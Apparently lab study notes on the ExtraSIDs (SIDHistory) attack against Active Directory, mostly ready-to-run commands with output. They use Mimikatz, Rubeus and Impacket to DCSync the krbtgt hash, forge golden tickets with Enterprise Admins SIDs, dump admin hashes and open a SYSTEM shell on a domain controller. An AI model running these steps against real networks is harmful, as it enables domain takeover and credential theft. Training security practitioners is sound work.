The ExtraSIDs attack (or SIDHistory abuse) involves injecting the SIDs of any highly privileged user or group from the parent domain into the SIDHistory field of a forged Kerberos TGT (Ticket Granting Ticket). This allows an attacker to impersonate high-privilege users in the parent domain or become a member of highly privileged groups, such as Domain Admins or Enterprise Admins.
## From Windows Mimikatz
To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

#### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```powershell
mimikatz > lsadump::dcsync /user:LOGISTICS\krbtgt
```
#### Using Get-DomainSID with Powerview
```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```
#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.
```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                              objectsid                                    
-----------------                                              ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        S-1-5-21-3842939050-3880317879-2865463114-519
```
#### Creating a Golden Ticket with Mimikatz
```powershell
mimikatz > kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
#### Confirming a Kerberos Ticket is in Memory Using klist
```powershell
PS C:\htb> klist
```
From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.
#### Listing the Entire C: Drive of the Domain Controller
```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```

---
## From Windows Rubeus
Same process as above to find SIDs
#### Creating a Golden Ticket using Rubeus
```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Confirming the Ticket is in Memory Using klist
```powershell
PS C:\htb> klist
```
#### Performing a DCSync Attack
DCSync on lab_adm user, Domain Admin of Parent Domain
```powershell
mimikatz > lsadump::dcsync /user:INLANEFREIGHT\lab_adm 
```
When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller.
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

---
---
---

## From Linux (Manual Method)
#### Performing DCSync with secretsdump.py
```shell
> secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
```shell-session
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```
#### Performing SID Brute Forcing using lookupsid.py
```shell
> lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
...
1001: LOGISTICS\lab_adm (SidTypeUser)
...
```
User SID = Domain SID + User RID
`S-1-5-21-2806153819-209893948-922872689-1001`
#### Looking for the Domain SID
```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```
#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114

519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```
#### Constructing a Golden Ticket using ticketer.py
```shell
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

[*] Saving ticket in hacker.ccache
```
#### Setting the KRB5CCNAME Environment Variable
```shell
export KRB5CCNAME=hacker.ccache 
```
#### Getting a SYSTEM shell using Impacket's psexec.py
```shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

---
## From Linux (Automated Method)
#### Performing the Attack with raiseChild.py 
```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```